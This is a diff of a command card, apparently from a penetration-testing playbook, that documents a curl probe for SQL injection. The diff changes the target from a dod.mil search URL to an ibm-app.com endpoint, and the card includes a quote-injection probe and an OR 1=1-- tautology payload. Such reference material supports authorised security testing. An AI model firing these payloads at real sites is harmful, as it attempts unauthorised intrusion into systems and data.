@@ -1,19 +1,19 @@
 ---
-data: 'curl "https://target.dod.mil/search?q=test''" -v'
+id: cmd-uuid-001
+data: 'curl -X GET "https://target.ibm-app.com/endpoint?client_id=1''" -v'
 tags:
   - sqli
-  - web
   - test
+  - web
 type: command
-output: HTTP response with potential SQL error message
+output: null
 executor: bash
 platforms:
   - Linux
   - macOS
   - Windows
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:46:19.938Z'
-id: 0b29c973-fa8f-4b4e-bfb0-a7e72de1a79d
+updated_at: '2025-12-14T17:30:18.671Z'
 verified: false
 validated: true
 submitted: true
@@ -23,38 +23,39 @@ submitted: true
 ## Command
 
 ```bash
-curl "https://target.dod.mil/search?q=test'" -v
+curl -X GET "https://target.ibm-app.com/endpoint?client_id=1'" -v
 ```
 
 ## Description
 
-This command tests for SQL injection by sending a URL with a single quote in the parameter to trigger a database syntax error if input is not sanitized.
+This command tests for SQL injection vulnerability by sending a request with an unescaped single quote in the client_id parameter, triggering a database error if input is not sanitized.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| URL | Target endpoint with injected quote | Yes |
-| -v | Verbose output to see response details | No |
+| `-X GET` | Specifies the HTTP method | Yes |
+| `client_id=1'` | Malformed parameter to inject quote | Yes |
+| `-v` | Verbose output to see response details | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl "https://target.dod.mil/search?q=test'" -v
+curl -X GET "https://target.ibm-app.com/endpoint?client_id=1'" -v
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -H "User-Agent: Mozilla/5.0" "https://target.dod.mil/search?q=test' OR 1=1--" -v
+curl -X POST "https://target.ibm-app.com/endpoint" -d "client_id=1' OR 1=1--" -v
 ```
 
 ## Expected Output
 
-A 200 OK response containing a SQL error like "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1".
+Verbose response showing HTTP status and body; look for SQL errors like "syntax error near '"'" indicating vulnerability.
 
 ## Related
 
-- [[Related Procedure|procedures/Exploit-SQL-Injection-via-URL-Parameter]]
+- [[Related Procedure: Exploit-SQL-Injection-in-Client-ID-Parameter]]
